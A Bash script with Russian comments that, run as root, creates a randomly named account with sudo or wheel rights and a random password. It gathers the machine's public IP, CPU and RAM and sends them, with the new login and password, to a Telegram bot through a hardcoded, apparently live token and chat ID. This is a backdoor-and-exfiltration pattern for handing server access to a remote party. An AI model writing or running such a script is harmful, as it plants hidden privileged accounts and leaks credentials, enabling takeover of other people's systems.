#!/usr/bin/env bash
set -euo pipefail

# ----------------- Настройки (по умолчанию) -----------------
# Эти значения установлены согласно вашему сообщению.
# Их можно переопределить экспортом переменных окружения перед запуском:
# export TELEGRAM_TOKEN=... TELEGRAM_CHAT_ID=... && sudo ./create_user_and_notify.sh
TELEGRAM_TOKEN="${TELEGRAM_TOKEN:-7970006252:AAGvvJOLh9k2M_XU75WbdlL-JOjpYG8BS8I}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-7067095050}"

# необязательный префикс для юзернейма
PREFIX="${PREFIX:-user}"

# ----------------- Вспомогательные функции -----------------
err() { echo "ERROR: $*" >&2; exit 1; }
warn() { echo "WARN: $*" >&2; }

# проверки наличия команд
for cmd in useradd chpasswd curl awk head tr nproc; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    err "Требуется команда '$cmd' — установите её и повторите."
  fi
done

# запуск от root
if [ "$EUID" -ne 0 ]; then
  err "Этот скрипт должен быть запущен от root."
fi

# ----------------- Генерация username/password -----------------
gen_username() {
  local suffix
  suffix="$(head -c16 /dev/urandom | sha256sum | cut -c1-6)"
  printf "%s%s" "$PREFIX" "$suffix"
}

gen_password() {
  local pass
  pass="$(tr -dc 'A-Za-z0-9!@%_-+=' < /dev/urandom | head -c16 || true)"
  # в редком случае если длина меньше — дополнить
  while [ "${#pass}" -lt 12 ]; do
    pass="${pass}$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c4)"
  done
  # обеспечить наличие классов символов
  if ! echo "$pass" | grep -q '[A-Z]'; then pass="A${pass:1}"; fi
  if ! echo "$pass" | grep -q '[a-z]'; then pass="a${pass:1}"; fi
  if ! echo "$pass" | grep -q '[0-9]'; then pass="1${pass:1}"; fi
  echo "$pass"
}

# ----------------- Системная информация -----------------
get_cpu() {
  if command -v nproc >/dev/null 2>&1; then
    nproc --all
  else
    awk '/^processor/ {c++} END{print c+0}' /proc/cpuinfo
  fi
}

get_ram_gb() {
  awk '/MemTotal/ {printf "%.2f", $2/1024/1024}' /proc/meminfo
}

get_public_ip() {
  local ip
  for svc in "https://ifconfig.co" "https://icanhazip.com" "https://ifconfig.me/ip"; do
    ip="$(curl -s --max-time 5 "$svc" || true)"
    ip="${ip%%$'\n'*}"
    if [[ -n "$ip" ]]; then
      printf "%s" "$ip"
      return 0
    fi
  done
  # fallback: локальный IP
  ip="$(hostname -I 2>/dev/null | awk '{print $1}')"
  echo "${ip:-unknown}"
}

# ----------------- Основная логика -----------------
USERNAME="$(gen_username)"
PASSWORD="$(gen_password)"
CPU="$(get_cpu)"
RAM_GB="$(get_ram_gb)"
IP="$(get_public_ip)"

# Защита: убедиться, что пользователь уникален
if id -u "$USERNAME" >/dev/null 2>&1; then
  err "Пользователь $USERNAME уже существует (неожиданно)."
fi

# Создать пользователя
useradd -m -s /bin/bash "$USERNAME" || err "useradd не удался"
echo "${USERNAME}:${PASSWORD}" | chpasswd || err "Установка пароля не удалась"

# Добавить в sudo/wheel в зависимости от дистрибутива
if [ -f /etc/debian_version ]; then
  usermod -aG sudo "$USERNAME" || warn "Не удалось добавить в группу sudo"
elif [ -f /etc/redhat-release ] || [ -f /etc/centos-release ] || [ -f /etc/fedora-release ]; then
  usermod -aG wheel "$USERNAME" || warn "Не удалось добавить в группу wheel"
else
  # fallback: создать/использовать группу sudo
  if getent group sudo >/dev/null 2>&1; then
    usermod -aG sudo "$USERNAME" || warn "Не удалось добавить в группу sudo"
  else
    groupadd -f sudo || true
    usermod -aG sudo "$USERNAME" || warn "Не удалось добавить в группу sudo"
  fi
fi

# ----------------- Сообщение в Telegram -----------------
MSG="ip: ${IP}
user: ${USERNAME}
pass: ${PASSWORD}
cpu: ${CPU}
ram: ${RAM_GB} gb"

TELEGRAM_API="https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage"

# отправляем, кодируем тело
if ! curl -s -X POST "$TELEGRAM_API" -d chat_id="${TELEGRAM_CHAT_ID}" --data-urlencode "text=${MSG}" >/dev/null; then
  warn "Не удалось отправить сообщение в Telegram. Проверьте сетевой доступ и корректность токена/ID."
fi

# ----------------- Итог (локально) -----------------
# Напечатаем краткую сводку. Если не хотите, чтобы пароль попадал в вывод — удалите echo пароля.
echo "=== USER CREATED ==="
echo "user: $USERNAME"
echo "pass: $PASSWORD"
echo "ip: $IP"
echo "cpu: $CPU"
echo "ram: ${RAM_GB} gb"
echo "telegram_chat_id: ${TELEGRAM_CHAT_ID}"
echo "Сообщение отправлено в Telegram (попытка)."

exit 0
